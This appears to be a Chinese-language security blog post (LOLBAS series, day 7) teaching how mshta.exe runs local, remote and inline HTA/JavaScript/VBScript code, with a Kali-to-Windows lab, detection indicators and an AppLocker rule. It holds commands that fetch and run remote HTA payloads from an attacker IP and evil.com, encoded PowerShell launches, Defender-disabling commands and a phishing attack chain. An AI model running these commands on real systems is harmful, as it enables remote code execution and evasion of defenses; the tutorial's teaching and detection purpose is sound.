---
title: "LOLBAS鐵人賽Day7Mshta.exe深度實戰：HTA應用程式的惡意執行"
published: 2025-09-21T02:58:36.000Z
description: "LOLBAS 系列第 7 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

mshta.exe 是用來執行 HTA（HTML Application）檔案的工具，  
偶爾看到一些老舊的企業內部工具會用 HTA 做簡單的 GUI 介面  
其實 mshta 不只能執行本地 HTA，還能直接執行遠端檔案  
甚至能執行 JavaScript/VBScript 程式碼，完全不需要檔案落地！

## 什麼是 HTA？

HTA（HTML Application）是 Microsoft 在 Internet Explorer 5 時代推出的技術，  
讓開發者可以用 HTML + JavaScript/VBScript 來建立桌面應用程式

### HTA 的特點

*   **副檔名**：`.hta`
*   **執行程式**：`mshta.exe`（Microsoft HTML Application Host）
*   **權限**：以**完整的本地權限**執行（不受瀏覽器沙箱限制）
*   **支援語言**：HTMLJavaScriptVBScriptCSS
*   **特殊能力**：可以存取檔案系統執行系統命令操作登錄機碼

### 正常的 HTA 範例

```html
<html>
<head>
  <title>系統資訊檢視器</title>
  <HTA:APPLICATION 
    ID="SysInfo"
    APPLICATIONNAME="System Info"
    BORDER="dialog"
    ICON="info.ico">
</head>
<body>
  <h1>系統資訊</h1>
  <script language="JavaScript">
    var wmi = GetObject("winmgmts:");
    var os = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
    document.write("OS: " + os.Caption);
  </script>
</body>
</html>

```

### 為什麼 HTA 危險？

1.  **完整系統權限**：不像網頁受到沙箱限制，HTA 可以做任何事
2.  **看起來無害**：副檔名不在常見的危險清單中（.exe.bat.ps1）
3.  **支援遠端載入**：可以直接執行網路上的 HTA
4.  **內建於 Windows**：mshta.exe 是系統元件，有合法簽章

今天就來實測 Windows 11 上 mshta 的各種危險用法

### HTA vs 其他檔案類型

檔案類型

執行方式

權限等級

網路執行

Windows Defender

.exe

直接執行

完整

需下載

x

.ps1

PowerShell

受限於執行原則

可以

x

.js/.vbs

wscript/cscript

受限

需下載

x

**.hta**

**mshta.exe**

**完整**

**直接執行**

**較少監控**

## 環境準備

今天的實作會需要兩台機器：

```
Attacker Machine: Kali
Victim Machine: Windows 11

```

### Attacker Machine (Kali)：

```bash
# 建立測試目錄
mkdir ~/mshta_demo && cd ~/mshta_demo

# 建立標準 HTA 檔案
cat > payload.hta << 'EOF'
<html>
<head>
<title>Test HTA</title>
<HTA:APPLICATION ID="TestHTA" 
   APPLICATIONNAME="Test" 
   WINDOWSTATE="minimize">
</head>
<body>
<script language="VBScript">
  Set shell = CreateObject("WScript.Shell")
  shell.Run "calc.exe"
  shell.Run "cmd.exe /c echo HTA_Executed > C:\Windows\Temp\mshta_test.txt", 0
  Self.Close
</script>
</body>
</html>
EOF

# 建立 JavaScript 版本
cat > js_payload.hta << 'EOF'
<script language="JavaScript">
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("calc.exe");
  shell.Run("powershell -c Write-Host 'MSHTA Executed!' -ForegroundColor Red");
  window.close();
</script>
EOF

# 建立混合 payload（PowerShell）
cat > ps_payload.hta << 'EOF'
<script>
var c = "powershell -enc ";
var e = "V3JpdGUtSG9zdCAnRW5jb2RlZCBQYXlsb2FkIScgLUZvcmVncm91bmRDb2xvciBSZWQ7IGNhbGMuZXhl";
new ActiveXObject("WScript.Shell").Run(c+e,0);
window.close();
</script>
EOF

# 啟動 Web Server
python3 -m http.server 8080

```

### Victim Machine (Windows 11)：

```cmd
:: 建立測試環境
mkdir C:\TestLab
cd C:\TestLab

:: 暫時關閉防護（測試環境）
powershell -c "Add-MpPreference -ExclusionPath 'C:\TestLab'"
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"

```

## Mshta 三大危險技巧

### 技巧一：執行遠端 HTA（最直接）

```cmd
:: 設定攻擊者 IP
set ATTACKER=10.211.55.6

:: 直接執行遠端 HTA
mshta http://%ATTACKER%:8080/payload.hta

:: HTTPS 版本（繞過某些防火牆）
mshta https://evil.com/payload.hta

:: 短網址（隱藏真實來源）
mshta http://bit.ly/3xY

:: 一行執行（常見於釣魚郵件）
cmd /c mshta http://%ATTACKER%:8080/js_payload.hta

```

執行後計算機會彈出，完全不需要下載檔案到本地！

### 技巧二：執行 inline JavaScript/VBScript（無檔案）

這是最危險的技術，完全不需要 HTA 檔案：

```cmd
:: JavaScript inline 執行
mshta javascript:alert("Test");window.close();

:: 執行系統命令
mshta javascript:var%20s=new%20ActiveXObject('WScript.Shell');s.Run('calc.exe');window.close();

:: VBScript 版本
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run(""calc.exe""):window.close")

:: 更複雜的 payload
mshta javascript:window.moveTo(-4000,-4000);window.resizeTo(0,0);var%20s=new%20ActiveXObject('WScript.Shell');s.Run('powershell%20-w%20hidden%20-c%20calc');window.close();

```

## 實戰：完整攻擊鏈

### 典型的 HTA 釣魚攻擊流程

```
1. 攻擊者發送釣魚郵件
   主旨：緊急：請查看您的薪資單
   附件：Payroll_2024.doc.hta（雙重副檔名偽裝）

2. 使用者點擊附件
   Windows 預設用 mshta.exe 開啟

3. HTA 執行惡意程式碼
   - 顯示假的錯誤訊息（檔案已損壞）
   - 背景下載真正的惡意程式
   - 建立持續性機制

4. 清理痕跡
   - HTA 自我刪除
   - 清除事件日誌

```

## 偵測與防禦

### 關鍵偵測指標

*   `mshta.exe` + HTTP/HTTPS URL
*   `mshta.exe` + `javascript:` 或 `vbscript:`
*   `mshta.exe` 產生 PowerShell/CMD 子程序
*   `mshta.exe` 從 Office/瀏覽器啟動

### 檢查系統痕跡

```powershell
# 檢查 Temp 檔案
Get-ChildItem "$env:TEMP" -Filter "*.hta" -ErrorAction SilentlyContinue

# 檢查啟動項目
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | 
    Select-Object * | Where-Object {$_ -match "mshta"}

# 檢查排程任務
Get-ScheduledTask | Where-Object {$_.Actions.Execute -match "mshta"}

```

### AppLocker 規則

```xml
<FilePathRule Id="Block_MSHTA" Name="Block MSHTA Network" Action="Deny">
  <Conditions>
    <FilePathCondition Path="%SYSTEM32%\mshta.exe"/>
  </Conditions>
</FilePathRule>

```

### 群組原則

*   禁用 HTA 檔案關聯
*   限制 mshta.exe 執行權限
*   阻擋 mshta 的網路存取

## 總結！

Mshta 是個極度危險的 LOLBAS 工具，因為它：

*   **原生支援腳本** - JavaScript/VBScript 直接執行
*   **支援遠端載入** - 不需要檔案落地
*   **Inline 執行** - 完全無檔案攻擊
*   **使用者信任** - 看起來像正常的 HTML 應用

p.s HTA 技術很老但很有效，因為 Windows 需要向後相容有趣的是，Microsoft Edge 已經不支援 HTA，但 mshta.exe 還在，所以攻擊者仍然可以利用